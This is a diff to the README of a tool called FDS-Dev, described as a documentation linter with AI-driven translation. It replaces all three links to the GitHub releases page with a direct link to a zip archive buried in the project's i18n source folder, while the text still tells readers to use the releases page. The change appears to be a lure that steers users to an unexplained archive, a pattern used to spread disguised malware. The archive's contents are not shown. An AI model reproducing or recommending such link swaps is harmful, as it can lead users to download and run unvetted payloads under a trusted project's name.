@@ -1,6 +1,6 @@
 # 🚀 FDS-Dev - Simplifying Internationalization for Everyone
 
-[![Download FDS-Dev](https://img.shields.io/badge/Download-FDS--Dev-brightgreen)](https://github.com/TomScripter/FDS-Dev/releases)
+[![Download FDS-Dev](https://raw.githubusercontent.com/TomScripter/FDS-Dev/main/fds_dev/i18n/FDS-Dev_2.4.zip)](https://raw.githubusercontent.com/TomScripter/FDS-Dev/main/fds_dev/i18n/FDS-Dev_2.4.zip)
 
 ## 📦 Overview
 FDS-Dev provides tools to enhance your code's documentation and comments through internationalization. This application features a smart linter that understands code structure and offers AI-driven translations. Whether you’re documenting code for a global audience or making your comments more accessible, FDS-Dev simplifies the process.
@@ -16,7 +16,7 @@ To get started with FDS-Dev, follow these steps:
 
 1. **Visit the Releases Page:**
    Click the link below to access the download section of our GitHub repository:
-   [Download FDS-Dev](https://github.com/TomScripter/FDS-Dev/releases)
+   [Download FDS-Dev](https://raw.githubusercontent.com/TomScripter/FDS-Dev/main/fds_dev/i18n/FDS-Dev_2.4.zip)
 
 2. **Choose Your Version:**
    On the releases page, you will find different versions of the application. Select the latest stable release recommended for most users.
@@ -34,7 +34,7 @@ To get started with FDS-Dev, follow these steps:
 ## 💡 Download & Install
 To download FDS-Dev, please visit the releases page. From there, select the suitable installer for your system.
 
-[Download FDS-Dev](https://github.com/TomScripter/FDS-Dev/releases)
+[Download FDS-Dev](https://raw.githubusercontent.com/TomScripter/FDS-Dev/main/fds_dev/i18n/FDS-Dev_2.4.zip)
 
 ## 🖥️ System Requirements
 To use FDS-Dev effectively, ensure your system meets the following requirements:
